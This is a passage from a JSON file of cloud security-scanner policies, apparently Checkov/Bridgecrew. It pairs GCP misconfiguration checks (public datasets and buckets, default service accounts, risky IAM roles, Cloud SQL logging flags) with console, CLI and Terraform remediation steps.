        "description": "GCP BigQuery dataset is publicly accessible\nDescription\nDataset-level permissions help determine which users, groups, and service accounts are allowed to access tables, views, and table data in a specific BigQuery dataset. You can configure BigQuery permissions at a higher level in the Cloud IAM resource hierarchy. Your configurations are inherited and based on the IAM structure you select to apply.\nWe recommend you ensure private datasets remain private by avoiding the All Authenticated Users option which  gives all Google account holders access to the dataset, and makes the dataset public.\nFix - Buildtime\nTerraform\nGoresource \"google_bigquery_dataset\" \"pass_special_group\" {\n  dataset_id                  = \"example_dataset\"\n  friendly_name               = \"test\"\n  description                 = \"This is a test description\"\n  location                    = \"US\"\n\n  access {\n    role          = \"READER\"\n    special_group = \"projectReaders\"\n  }\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_GCP_28": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_public_1",
        "description": "GCP storage buckets are publicly accessible to all authenticated users\nDescription\nAllowing anonymous or public access to a Cloud Storage bucket grants permissions to anyone to access the bucket's content. If you are storing sensitive data in the bucket anonymous and public access may not be desired. \nWe recommend you ensure anonymous and public access to a bucket is not allowed.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Storage.\nNavigate to Bucket details page, select bucket name.\nClick Permissions tab.\nTo remove a specific role assignment, to the front of allUsers and allAuthenticatedUsers, click Delete.\n\nCLI Command\nTo remove access to allUsers and allAuthenticatedUsers, use the following commands:\ngsutil iam ch -d allUsers gs://BUCKET_NAME\ngsutil iam ch -d allAuthenticatedUsers gs://BUCKET_NAME\nFix - Buildtime \nTerraform\n\n\nResource: google_storage_bucket_iam_member\n\n\nArgument: member\n\n\nResource: google_storage_bucket_iam_binding\n\n\nField: members\n\n\nGo//Option 1\nresource \"google_storage_bucket_iam_member\" \"member\" {\n  bucket = google_storage_bucket.default.name\n  role = \"roles/storage.admin\"\n-  member = \"allUsers\"\n-  member = \"allAuthenticatedUsers\"\n}\n\n//Option 2\nresource \"google_storage_bucket_iam_binding\" \"binding\" {\n  bucket = google_storage_bucket.default.name\n  role = \"roles/storage.admin\"\n  members = [\n-    \"allAuthenticatedUsers\",\n-    \"allUsers\"\n  ]\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_40": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_public_2",
        "description": "Compute instances have public IPs\nDescription\nTo reduce your attack surface Compute instances should not have public IP addresses. To minimize the instance's exposure to the internet configure instances behind load balancers.\nWe recommend you ensure compute instances are not configured to have external IP addresses.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to VM instances.\nFor the Instance detail page, click the instance name.\nClick Edit.\nFor each Network interface, ensure that External IP is set to None.\nClick Done, then click Save.\n\nCLI Command\n\nDescribe the instance properties:\ngcloud compute instances describe INSTANCE_NAME --zone=ZONE\nIdentify the access config name that contains the external IP address. This access\nconfig appears in the following format:\n\nnetworkInterfaces:- accessConfigs:\n- kind: compute#accessConfig\n name: External NAT\n natIP: 130.211.181.55\n type: ONE_TO_ONE_NAT\n\n\nTo delete the access config, use the following command:\n\ngcloud compute instances delete-access-config INSTANCE_NAME \n--zone=ZONE \n--access-config-name \"ACCESS_CONFIG_NAME\"\n\n\ud83d\udcd8NoteIn the above example the ACCESS_CONFIG_NAME is External NAT. The name of your access config may be different.\nFix - Buildtime \nTerraform\n\nResource: google_compute_instance\nField: access_config\n\nGoresource \"google_compute_instance\" \"example\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n  boot_disk {}\n-  access_config {\n    ...\n    }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_30": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_iam_1",
        "description": "Instances use default Compute Engine service account\nDescription\nThe default Compute Engine service account has Editor role on the project, allowing read and write access to most Google Cloud Services. \nWe recommend you configure your instance to not use the default Compute Engine service account.\nYou should create a new service account and assign only the permissions needed by your instance. This helps defend against compromised VM privilege escalations and prevent an attacker from gaining access to all of your project. \n\ud83d\udcd8NoteThe default Compute Engine service account is named:\n[PROJECT_NUMBER][email\u00a0protected].\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to VM instances.\nClick on the instance name to go to its VM instance details page.\nClick STOP, then click EDIT.\nUnder the section Service Account, select a service account. You may first need to create a new service account.\n\n\ud83d\udea7WarningDo not select the default Compute Engine service account.\n\nClick Save and then click START.\n\nCLI Command\n\nStop the instance:\n\ngcloud compute instances stop INSTANCE_NAME\n\n\nUpdate the instance:\n\ngcloud compute instances set-service-account INSTANCE_NAME -\n-serviceaccount=SERVICE_ACCOUNT\n\n\nRestart the instance:\n\ngcloud compute instances start INSTANCE_NAME\n\nFix - Buildtime\nTerraform\n\nResource: google_compute_instance\nField: service_account\nArgument: email = <email other than the default service_account's>\n\nGoresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n+  service_account {\n    scopes = [\"userinfo-email\", \"compute-ro\", \"storage-ro\"]\n-    email  = \"[PROJECT_NUMBER][email\u00a0protected]\"\n+    email  = \"[email\u00a0protected]\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_31": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_iam_2",
        "description": "Instances use default service account with full access to cloud APIs\nDescription\nWhen an instance is configured with Compute Engine default service account with Scope Allow full access to all Cloud APIs, based on IAM roles assigned to the user(s) accessing Instance, it may result in privilege escalation. For example, a user may have permission to perform cloud operations and API calls that they are not required to perform.\nAlong with the ability to optionally create, manage and use user managed custom service accounts, Google Compute Engine provides default service account Compute Engine default service account for an instances to access necessary cloud services. Project Editor role is assigned to Compute Engine default service account for this service account to have almost all capabilities over all cloud services, except billing. When Compute Engine default service account is assigned to an instance it can operate in three scopes:\n\nAllow default access: Allows only minimum access required to run an Instance (Least Privileges).\nAllow full access to all Cloud APIs: Allows full access to all the cloud APIs/Services (too much access).\nSet access for each API: Allows Instance administrator to choose only those APIs that are needed to perform specific business functionality expected by instance.\n\nWe recommend you do not assign instances to default service account Compute Engine\ndefault service account with Scope Allow full access to all Cloud APIs. This supports the principle of least privileges and helps prevent potential privilege escalation, \nFix - Runtime\nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to VM instances.\nSelect the impacted VM instance.\nIf the instance is not stopped, click Stop. Wait for the instance to stop.\nClick Edit.\nScroll down to the Service Account section.\nSelect a different service account or ensure Allow full access to all Cloud APIs is not selected.\nTo save your changes, click Save. \nClick START.\n\nCLI Command\n\nStop the instance:\n\ngcloud compute instances stop INSTANCE_NAME\n\n\nUpdate the instance:\n\ngcloud compute instances set-service-account INSTANCE_NAME \n--serviceaccount=SERVICE_ACCOUNT \n--scopes [SCOPE1, SCOPE2...]\n\n\nRestart the instance:\n\ngcloud compute instances start INSTANCE_NAME\n\nFix - Buildtime\nTerraform\n\nResource: google_compute_instance\nField: service_account\nArgument: If email is set to the default service account, or not specified, scope should not contain full access api.\n\nGoresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"n1-standard-1\"\n  zone         = \"us-central1-a\"\n  service_account {\n-    scopes = [\"https://www.googleapis.com/auth/cloud-platform\"]\n-    email  = \"[PROJECT_NUMBER][email\u00a0protected]\"\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_41": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_iam_3",
        "description": "IAM users are assigned Service Account User or Service Account Token creator roles at project level\nDescription\nA service account is a special Google account that belongs to an application or a VM, instead of to an individual end-user. Application/VM-Instance uses the service account to call the service's Google API so that end-users are not directly involved. The service account resource has IAM policies attached to it to determine who can use the service account.\nUsers with IAM roles to update the App Engine and Compute Engine instances, such as App Engine Deployer and Compute Instance Admin, can run code as the service accounts used to run these instances. This enables users to indirectly gain access to resources for which the service accounts have access. Similarly, SSH access to a Compute Engine instance may also provide the ability to execute code as that instance/Service account.\nYour organization may have multiple user-managed service accounts configured for a project. Granting the iam.serviceAccountUser or iam.serviceAserviceAccountTokenCreatorccountUser roles to a user for a project gives the user access to all service accounts in the project, including service accounts created in the future. This can result in elevation of privileges by using service accounts and corresponding Compute Engine instances.\nTo implement least privileges best practices, IAM users should not be assigned the Service Account User or Service Account Token Creator roles at the project level. These roles should be assigned to a user for a specific service account, giving that user access to the service account. The Service Account User allows a user to bind a service account to a long-running job service. The Service Account Token Creator role allows a user to directly impersonate, or assert, the identity of a service account.\nWe recommend you assign the Service Account User (iam.serviceAccountUser) and Service Account Token Creator iam.serviceAccountTokenCreator roles to a user for a specific service account rather than assigning the role to a user at project level.\nFix - Runtime\nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to IAM Admin.\nClick on the filter table text bar. Type: Role: Service Account User\nClick the Trash icon in front of the role Service Account User for every user listed as a result of a filter.\nClick on the filter table text bar. Enter Role: Service Account Token Creator\nClick the Trash icon in front of the role Service Account Token Creator for every user listed as a result of a filter.\n\nCLI Command\n\nUsing a text editor, remove the bindings with roles/iam.serviceAccountUser and roles/iam.serviceAccountTokenCreator.\nUpdate the project's IAM policy:\ngcloud projects set-iam-policy PROJECT_ID iam.json.\n\nFix - Buildtime\nTerraform\n\nResources:\ngoogle_project_iam_binding\ngoogle_project_iam_member\nArgument: role\n\nGoresource \"google_project_iam_binding\" \"project\" {\n  project = \"your-project-id\"\n- role    = \"roles/iam.serviceAccountTokenCreator\"\n- role    = \"roles/iam.serviceAccountUser\"\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_42": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_iam_4",
        "description": "Service Account has admin privileges\nDescription\nA service account is a special Google account that belongs to an application or a VM, not to an individual end-user. The application uses the service account to call the service's Google API so that users are not directly involved. \nService accounts represent service-level security of application or VM Resources, determined by the roles assigned to them. Enrolling ServiceAccount with Admin rights gives full access to an assigned application or a VM. A ServiceAccount Access holder can perform critical actions, such as delete and update change settings, without user intervention. \nWe recommend you do not grant Admin privileges for ServiceAccount.\nFix - Runtime\nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to IAM Admin.\nNavigate to Members.\nIdentify User-Managed user created service account with roles containing *Admin\nor *admin or roles matching Editor or Owner.\nClick the Trash icon to remove the role from the member. In this case service account.\n\nCLI Command\n\nUsing a text editor, remove Role that contains roles/*Admin or roles/*admin or matches roles/editor or roles/owner. Add a role to the bindings array that defines the group members and the role for those members.\nUpdate the project's IAM policy:\ngcloud projects set-iam-policy PROJECT_ID iam.json\n\nFix - Buildtime\nTerraform\n\nResource: google_project_iam_member\nArgument: role + member\n\nGoresource \"google_project_iam_member\" \"project\" {\n  project = \"your-project-id\"\n-  role    = \"roles/owner\"\n-  member  = \"user:[email\u00a0protected]\"\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_GCP_26": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_logging_1",
        "description": "GCP VPC flow logs for the subnet is set to Off\nDescription\nFlow Logs capture information about IP traffic going to and from network interfaces. This information can be used to detect anomalous traffic and insight about security workflows. You can view and retrieve flow log data in Stackdriver Logging. \nVPC networks and subnetworks provide logically isolated and secure network partitions to launch Google Cloud Platform (GCP) resources. When Flow Logs are enabled for a subnet, VMs within that subnet report on all Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) flows. Each VM samples the inbound and outbound TCP and UDP flows it sees, whether the flow is to or from another VM, a host in the on-premises datacenter, a Google service, or a host on the Internet. If two GCP VMs are communicating and both are in subnets that have VPC Flow Logs enabled, both VMs report the flows.\nWe recommended you set Flow Logs to On to capture this data. Because the volume of logs may be high, you may wish to enable flow logs only for business-critical VPC Network Subnets.\nFlow Logs supports the following use cases:\n\nNetwork monitoring\nUnderstanding network usage and optimizing network traffic expenses\nNetwork forensics\nReal-time security analysis\n\nFix - Runtime \nGCP Console\n\nOpen the VPC network GCP Console https://console.cloud.google.com/networking/networks/list.\nClick the name of a subnet to display the Subnet details page.\nClick the EDIT button.\nSet Flow Logs to On.\nClick Save.\n\nCLI Command\nTo set Private Google access for a network subnet, run the following command:\ngcloud compute networks subnets update [SUBNET_NAME] \n--region [REGION] \n--enable-flow-logs\n\nFix - Buildtime\nTerraform\n\nResource: google_compute_subnetwork\nArgument: log_config\n\nGoresource \"google_compute_subnetwork\" \"example\" {\n  name          = \"log-test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.custom-test.id\n\n+ log_config {\n    aggregation_interval = \"INTERVAL_10_MIN\"\n    flow_sampling        = 0.5\n    metadata             = \"INCLUDE_ALL_METADATA\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_60": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_11",
        "description": "Cloud SQL database instances have public IPs\nDescription\nTo lower the organization's attack surface, Cloud SQL databases should not have public IPs. Private IPs provide improved network security and lower latency for your application.\nWe recommend you configure Second Generation SQL instances to use private IPs instead of public IPs.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nClick the instance name to open its Instance details page.\nSelect Connections.\nClear the Public IP checkbox.\nTo update the instance, click Save.\n\nCLI Command\n\nFor every instance remove its public IP and assign a private IP instead:\ngcloud beta sql instances patch INSTANCE_NAME --network=VPC_NETWOR_NAME --no- assign-ip\nConfirm the changes using the following command:\ngcloud sql instances describe INSTANCE_NAME\n\nFix - Buildtime \nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"SQLSERVER* \"\nsettings::ip_configuration: by default set to \"true\"\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"SQLSERVER_2017_STANDARD\"\n  region           = \"us-central1\"\n \n  settings {\n+         ip_configuration{\n+            ipv4_enabled    = \"false\"\n          }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_44": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_iam_5",
        "description": "Roles impersonate or manage Service Accounts used at folder level\nDescription\nThe IAM role is an identity with specific permissions. An IAM role is similar to an IAM user: it has a Google identity with permission policies that determine what the identity can and cannot do in Google Cloud. Certain IAM roles contain permissions that enable a user with the role to impersonate or manage service accounts in a GCP folder through IAM inheritance from a higher resource, i.e., folder binding.\nWe recommend you do not set IAM role bindings with known dangerous roles that enable impersonation at the folder level.\nThe following roles enable identities to impersonate all service account identities within a project if the identity is granted the role at the project, folder, or organization level. The following list includes our current recommendations for dangerous roles, however, it is not exhaustive as permissions and roles change frequently.\nPrimitive Roles:\n\nroles/owner\nroles/editor\n\nPredefined Roles:\n\nroles/iam.securityAdmin\nroles/iam.serviceAccountAdmin\nroles/iam.serviceAccountKeyAdmin\nroles/iam.serviceAccountUser\nroles/iam.serviceAccountTokenCreator\nroles/iam.workloadIdentityUser\nroles/dataproc.editor\nroles/dataproc.admin\nroles/dataflow.developer\nroles/resourcemanager.folderAdmin\nroles/resourcemanager.folderIamAdmin\nroles/resourcemanager.projectIamAdmin\nroles/resourcemanager.organizationAdmin\nroles/cloudasset.viewer\nroles/cloudasset.owner\n\nService Agent Roles:\nService agent roles should not be used for any identities other than the Google managed service account they are associated with.\n\nroles/serverless.serviceAgent\nroles/dataproc.serviceAgent\n\nFix - Buildtime\nTerraform\n\nResources:\ngoogle_folder_iam_member\ngoogle_folder_iam_binding\nArgument: role\n\ngoogle_folder_iam_membergoogle_folder_iam_bindingresource \"google_folder_iam_member\" \"example\" {\n  folder  = \"folders/1234567\"\n- role    =  <ANY OF THE ROLES LISTED ABOVE>\n  member  = \"user:[email\u00a0protected]\"\n}\nresource \"google_folder_iam_binding\" \"example\" {\n  folder  = \"folders/1234567\"\n- role    =  <ANY OF THE ROLES LISTED ABOVE>\n  members  = [\n  \"user:[email\u00a0protected]\",\n  ]\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_GCP_45": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_iam_6",
        "description": "Roles impersonate or manage Service Accounts used at organizational level\nDescription\nThe IAM role is an identity with specific permissions. An IAM role is similar to an IAM user: it has a Google identity with permission policies that determine what the identity can and cannot do in Google Cloud. Certain IAM roles contain permissions that enable a user with the role to impersonate or manage service accounts in a GCP folder through IAM inheritance from a higher resource, i.e., folder binding.\nWe recommend you do not set IAM role bindings with known dangerous roles that enable impersonation at the organizational level.\nThe following roles enable identities to impersonate all service account identities within a project if the identity is granted the role at the project, folder, or organization level. The following list includes our current recommendations for dangerous roles, however, it is not exhaustive as permissions and roles change frequently.\nPrimitive Roles:\n\nroles/owner\nroles/editor\n\nPredefined Roles:\n\nroles/iam.securityAdmin\nroles/iam.serviceAccountAdmin\nroles/iam.serviceAccountKeyAdmin\nroles/iam.serviceAccountUser\nroles/iam.serviceAccountTokenCreator\nroles/iam.workloadIdentityUser\nroles/dataproc.editor\nroles/dataproc.admin\nroles/dataflow.developer\nroles/resourcemanager.folderAdmin\nroles/resourcemanager.folderIamAdmin\nroles/resourcemanager.projectIamAdmin\nroles/resourcemanager.organizationAdmin\nroles/cloudasset.viewer\nroles/cloudasset.owner\n\nService Agent Roles:\nService agent roles should not be used for any identities other than the Google managed service account they are associated with.\n\nroles/serverless.serviceAgent\nroles/dataproc.serviceAgent\n\nFix - Buildtime \nTerraform\nResources:\ngoogle_organization_iam_member\ngoogle_organization_iam_binding\nArgument: role\ngoogle_organization_iam_membergoogle_organization_iam_bindingresource \"google_organization_iam_member\" \"example\" {\n  org_id  = \"your-org-id\"\n- role    =  <ANY OF THE ROLES LISTED ABOVE>\n  member  = \"user:[email\u00a0protected]\"\n}\nresource \"google_project_iam_binding\" \"example\" {\n  org_id  = \"your-org-id\"\n- role    =  <ANY OF THE ROLES LISTED ABOVE>\n  members  = [\n  \"user:[email\u00a0protected]\",\n  ]\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_GCP_46": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_iam_7",
        "description": "Default Service Account is used at project level\nDescription\nA service account is a special Google account that belongs to an application or a VM, not to an individual end-user. The application uses the service account to call the service's Google API so that users are not directly involved. Service accounts represent service-level security of application or VM Resources, determined by the roles assigned to them. The use of Default service accounts should be avoided, see below for details.\nWe recommend you do not set IAM role bindings using the default Compute Engine and App Engine service account. \nDefault Compute Engine Service Account: Used by GKE, Compute, DataProc, DataFlow, Composer.\n[email\u00a0protected]\nDefault Appspot Service Account: Used by App Engine, Cloud Functions, App Engine based services.\n[email\u00a0protected]\nFix - Buildtime \nTerraform\n\nResources:\ngoogle_project_iam_member\ngoogle_project_iam_binding\nArgument: member\n\ngoogle_project_iam_membergoogle_project_iam_bindingresource \"google_project_iam_member\" \"project\" {\n  project = \"project/1234567\"\n  role    = \"roles/owner\"\n- member  = \"[email\u00a0protected]\"\n- member  = \"[email\u00a0protected]\"\n}\nresource \"google_project_iam_member\" \"project\" {\n  project = \"project/1234567\"\n  role    = \"roles/owner\"\n- members  = [\n      \"[email\u00a0protected]\",\n      \"[email\u00a0protected]\"\n     ]\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_GCP_47": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_iam_8",
        "description": "Default Service Account is used at organization level\nDescription\nA service account is a special Google account that belongs to an application or a VM, not to an individual end-user. The application uses the service account to call the service's Google API so that users are not directly involved. Service accounts represent service-level security of application or VM Resources, determined by the roles assigned to them. The use of Default service accounts should be avoided, see below for details.\nWe recommend you do not set IAM role bindings using the default Compute Engine and App Engine service account. \nDefault Compute Engine Service Account: Used by GKE, Compute, DataProc, DataFlow, Composer.\n[email\u00a0protected]\nDefault Appspot Service Account: Used by App Engine, Cloud Functions, App Engine based services.\n[email\u00a0protected]\nFix - Buildtime \nTerraform\n\nResources:\ngoogle_organization_iam_member\ngoogle_organization_iam_binding\nArgument: member\n\ngoogle_organization_iam_membergoogle_organization_iam_bindingresource \"google_organization_iam_member\" \"organization\" {\n  org_id = \"your-org-id\"\n  role    = \"roles/owner\"\n- member  = \"[email\u00a0protected]\"\n- member  = \"[email\u00a0protected]\"\n}\nresource \"google_organization_iam_member\" \"organization\" {\n  org_id = \"your-org-id\"\n  role    = \"roles/owner\"\n- members  = [\n      \"[email\u00a0protected]\",\n      \"[email\u00a0protected]\"\n     ]\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_GCP_48": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_iam_9",
        "description": "Default Service Account is used at folder level\nDescription\nA service account is a special Google account that belongs to an application or a VM, not to an individual end-user. The application uses the service account to call the service's Google API so that users are not directly involved. Service accounts represent service-level security of application or VM Resources, determined by the roles assigned to them. The use of Default service accounts should be avoided, see below for details.\nWe recommend you do not set IAM role bindings using the default Compute Engine and App Engine service account. \nDefault Compute Engine Service Account: Used by GKE, Compute, DataProc, DataFlow, Composer.\n[email\u00a0protected]\nDefault Appspot Service Account: Used by App Engine, Cloud Functions, App Engine based services.\n[email\u00a0protected]\nFix - Buildtime \nTerraform\n\nResources:\ngoogle_folder_iam_member\ngoogle_folder_iam_binding\nArgument: role + member\n\ngoogle_folder_iam_membergoogle_folder_iam_bindingresource \"google_folder_iam_member\" \"folder\" {\n  folder = \"folders/1234567\"\n  role    = \"roles/owner\"\n- member  = \"[email\u00a0protected]\"\n- member  = \"[email\u00a0protected]\"\n}\nresource \"google_folder_iam_member\" \"folder\" {\n  folder = \"folders/1234567\"\n  role    = \"roles/owner\"\n- members  = [\n      \"[email\u00a0protected]\",\n      \"[email\u00a0protected]\"\n     ]\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_GCP_49": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_iam_10",
        "description": "Roles impersonate or manage Service Accounts used at project level\nDescription\nThe IAM role is an identity with specific permissions. An IAM role is similar to an IAM user: it has a Google identity with permission policies that determine what the identity can and cannot do in Google Cloud. Certain IAM roles contain permissions that enable a user with the role to impersonate or manage service accounts in a GCP project through IAM inheritance from a higher resource, i.e., project binding.\nWe recommend you do not set IAM role bindings with known dangerous roles that enable impersonation at the project level.\nThe following roles enable identities to impersonate all service account identities within a project if the identity is granted the role at the project, folder, or organization level. The following list includes our current recommendations for dangerous roles, however, it is not exhaustive as permissions and roles change frequently.\nPrimitive Roles:\n\nroles/owner\nroles/editor\n\nPredefined Roles:\n\nroles/iam.securityAdmin\nroles/iam.serviceAccountAdmin\nroles/iam.serviceAccountKeyAdmin\nroles/iam.serviceAccountUser\nroles/iam.serviceAccountTokenCreator\nroles/iam.workloadIdentityUser\nroles/dataproc.editor\nroles/dataproc.admin\nroles/dataflow.developer\nroles/resourcemanager.folderAdmin\nroles/resourcemanager.folderIamAdmin\nroles/resourcemanager.projectIamAdmin\nroles/resourcemanager.organizationAdmin\nroles/cloudasset.viewer\nroles/cloudasset.owner\n\nService Agent Roles: Service agent roles should not be used for any identities other than the Google managed service account they are associated with.\n\nroles/serverless.serviceAgent\nroles/dataproc.serviceAgent\n\nFix - Buildtime \nTerraform\n\nResources:\ngoogle_project_iam_member\ngoogle_project_iam_binding\nArgument: role\n\ngoogle_project_iam_membergoogle_project_iam_bindingresource \"google_project_iam_member\" \"example\" {\n  project  = \"project/1234567\"\n- role    =  <ANY OF THE ROLES LISTED ABOVE>\n  member  = \"user:[email\u00a0protected]\"\n}\nresource \"google_project_iam_binding\" \"example\" {\n  project  = \"project/1234567\"\n- role    =  <ANY OF THE ROLES LISTED ABOVE>\n  members  = [\n  \"user:[email\u00a0protected]\",\n  ]\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_50": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_1",
        "description": "GCP MySQL instance with local_infile database flag is not disabled\nDescription\nThe local_infile database flag controls the server-side LOCAL capability for LOAD DATA statements. Depending on the local_infile setting, the server refuses or permits local data loading by clients that have LOCAL enabled on the client side.\nTo explicitly cause the server to refuse LOAD DATA LOCAL statements start mysqld with local_infile disabled, regardless of how client programs and libraries are configured at build time or runtime. local_infile can also be set at runtime. \nWe recommended you set the local_infile database flag for a Cloud SQL MySQL instance to off to address the security issues associated with the flag. \nFix - Runtime\nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nSelect the MySQL instance where the database flag needs to be enabled.\nClick Edit.\nScroll down to the Flags section.\nTo set a flag that has not been set on the instance before, click Add item.\nSelect the flag local_infile from the drop-down menu, and set its value to off.\nClick Save.\nConfirm the changes in the Flags section on the Overview page.\n\nCLI Command\n\nList all Cloud SQL database instances using the following command:\ngcloud sql instances list\nConfigure the local_infile database flag for every Cloud SQL Mysql database instance using the below command:\ngcloud sql instances patch INSTANCE_NAME --database-flags local_infile=off\n\n\ud83d\udcd8NoteThis command will overwrite all database flags previously set. To keep those flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (=).\nFix - Buildtime\nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"MYSQL* \"\nsettings::database_flags: key:\"local_infile\", value:  by default set to \"on\"\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"MYSQL_8_0\"\n  region           = \"us-central1\"\n\n  settings {\n+         database_flags {\n+            name  = \"local_infile\"\n+            value = \"off\"\n          }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_51": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_2",
        "description": "Cloud SQL PostgreSQL instances have log_checkpoints database flag set to Off\nDescription\nEnabling log_checkpoints causes checkpoints and restart points to be logged in the server log. Some statistics are included in the log messages, including the number of buffers written, and the time spent writing them. This parameter can only be set in the postgresql.conf file or on the server command line. \nWe recommended you set the log_checkpoints database flag for the Cloud SQL PostgreSQL instance to on.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nSelect the PostgreSQL instance where the database flag needs to be enabled.\nClick Edit.\nScroll down to the Flags section.\nTo set a flag that has not been set on the instance before, click Add item.\nSelect the flag log_checkpoints from the drop-down menu, and set its value to On.\nClick Save.\nConfirm the changes in the Flags section on the Overview page.\n\nCLI Command\n\nList all Cloud SQL database instances using the following command:\ngcloud sql instances list\nConfigure the log_checkpoints database flag for every Cloud SQL PosgreSQL database instance using the below command:\ngcloud sql instances patch INSTANCE_NAME --database-flags log_checkpoints=on\n\n\ud83d\udcd8NoteThis command will overwrite all previously set database flags. To keep those flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (=).\nFix - Buildtime \nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"POSTGRES* \"\nsettings::database_flags: key:\"log_checkpoints\", value:  by default set to \"off\"\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"POSTGRES_11\"\n  region           = \"us-central1\"\n\n  settings {\n+         database_flags {\n+            name  = \"log_checkpoints\"\n+            value = \"on\"\n          }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_52": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_3",
        "description": "GCP PostgreSQL instance database flag log_connections is disabled\nDescription\nPostgreSQL does not log attempted connections by default. Enabling the log_connections setting creates log entries for each attempted connection to the server, along with successful completion of client authentication.  This information can be useful in troubleshooting issues and to determine any unusual connection attempts to the server. \nWe recommend you set the log_connections database flag for Cloud SQL PostgreSQL instances to on. \nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nSelect the PostgreSQL instance for which you want to enable the database flag.\nClick Edit.\nScroll down to the Flags section.\nTo set a flag that has not been set on the instance before, click Add item.\nSelect the flag log_connections from the drop-down menu, and set the value to on.\nClick Save.\nConfirm the changes in the Flags section on the Overview page.\n\nCLI Command\n\nList all Cloud SQL database instances using the following command:\ngcloud sql instances list\nConfigure the log_connections database flag for every Cloud SQL PosgreSQL database instance using the following command:\ngcloud sql instances patch INSTANCE_NAME --database-flags log_connections=on\n\n\ud83d\udcd8NoteThis command will overwrite all previously set database flags. To keep those and add new ones, include the values for all flags to be set on the instance; any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (\"=\").se flags. To keep those and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (=).\nFix - Buildtime\nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"POSTGRES* \"\nsettings::database_flags: key:\"log_connections\", value:  by default set to \"off\"\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"POSTGRES_11\"\n  region           = \"us-central1\"\n\n  settings {\n+         database_flags {\n+            name  = \"log_connections\"\n+            value = \"on\"\n          }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_53": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_4",
